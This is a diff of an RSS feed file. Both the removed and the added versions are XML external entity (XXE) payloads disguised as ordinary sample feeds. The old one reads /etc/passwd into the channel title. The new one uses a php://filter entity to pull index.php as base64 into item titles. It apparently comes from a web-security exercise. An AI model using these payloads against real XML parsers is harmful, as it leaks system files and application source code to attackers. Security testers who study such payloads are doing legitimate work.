@@ -1,73 +1,22 @@
-<?xml version="1.0"?>
-<!DOCTYPE SS [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-　<!-- RSS版本 -->
-　<rss version="2.0">
-　<!-- 以下为频道信息及新闻列表 -->
-　<channel>
-　　<!-- 频道总体信息：开始 -->
-　　<!-- 频道标题 -->
-　　<title>&xxe;</title>
-　　<!-- 频道链接的总地址 -->
-　　<link>http://liftoff.msfc.nasa.gov/</link>
-　　<!-- 频道描述文字 -->
-　　<description>Liftoff to Space Exploration.</description>
-　　<!-- 频道使用的语言（zh-cn表示简体中文） -->
-　　<language>en-us</language>
-　　<!-- 频道发布的时间 -->
-　　<pubDate>Tue, 10 Jun 2003 04:00:00 GMT</pubDate>
-　　<!-- 频道最后更新的时间-->
-　　<lastBuildDate>Tue, 10 Jun 2003 09:41:01 GMT</lastBuildDate>
-　　<docs>http://blogs.law.harvard.edu/tech/rss</docs>
-　　<!-- 频道生成器 -->
-　　<generator>Weblog Editor 2.0</generator>
-　　<managingEditor>editor@example.com</managingEditor>
-　　<webMaster>webmaster@example.com</webMaster>
-　　<ttl>5</ttl>
-　　<!-- 频道总体信息：结束 -->
-　　<!-- 每条RSS新闻信息都包含在item节点中, -->
-　　<item>
-　　<!-- 新闻标题 -->
-　　<title>Star City</title>
-　　<!-- 新闻链接地址 -->
-　　<link>http://liftoff.msfc.nasa.gov/news/2003/news-starcity.asp</link>
-　　<!-- 新闻内容简要描述 -->
-　　<description>How do Americans get ready to work with Russians aboard the
-　　International Space Station? They take a crash course in culture, language
-　　and protocol at Russia's Star City.</description>
-　　<!-- 新闻发布时间 -->
-　　<pubDate>Tue, 03 Jun 2003 09:39:21 GMT</pubDate>
-　　<!-- 新闻目录 -->
-　　<category>IT</category>
-　　<!-- 新闻作者 -->
-　　<author>bill</author>
-　　<guid>http://liftoff.msfc.nasa.gov/2003/06/03.html#item573</guid>
-　　</item>
-　　<item>
-　　<title>Space Exploration</title>
-　　<link>http://liftoff.msfc.nasa.gov/</link>
-　　<description>Sky watchers in Europe, Asia, and parts of Alaska and Canada
-　　will experience a partial eclipse of the Sun on Saturday, May 31st.</description>
-　　Fri, 30 May 2003 11:06:42 GMT</pubDate>
-　　<guid>http://liftoff.msfc.nasa.gov/2003/05/30.html#item572</guid>
-　　</item>
-　　<item>
-　　<title>The Engine That Does More</title>
-　　<link>http://liftoff.msfc.nasa.gov/news/2003/news-VASIMR.asp</link>
-　　<description>Before man travels to Mars, NASA hopes to design new engines
-　　that will let us fly through the Solar System more quickly. The proposed
-　　VASIMR engine would do that.</description>
-　　Tue, 27 May 2003 08:37:32 GMT</pubDate>
-　　<guid>http://www.zhanghangfeng.cn/rss.xml</guid>
-　　</item>
-　　<item>
-　　<title>Astronauts' Dirty Laundry</title>
-　　<link>http://liftoff.msfc.nasa.gov/news/2003/news-laundry.asp</link>
-　　<description>Compared to earlier spacecraft, the International Space
-　　Station has many luxuries, but laundry facilities are not one of them.
-　　Instead, astronauts have other options.</description>
-　　Tue, 20 May 2003 08:56:02 GMT</pubDate>
-　　<guid>http://liftoff.msfc.nasa.gov/2003/05/20.html#item570</guid>
-　　</item>
-　　</channel>
-　</rss>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+<rss version="2.0">
+<channel>
+  <title>&sp;</title>
+  <link>https://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
+  <item>
+    <title>&sp;</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools</description>
+  </item>
+  <item>
+    <title>XML Tutorial</title>
+    <link>https://www.w3schools.com/xml</link>
+    <description>New XML tutorial on W3Schools</description>
+  </item>
+</channel>
+</rss>
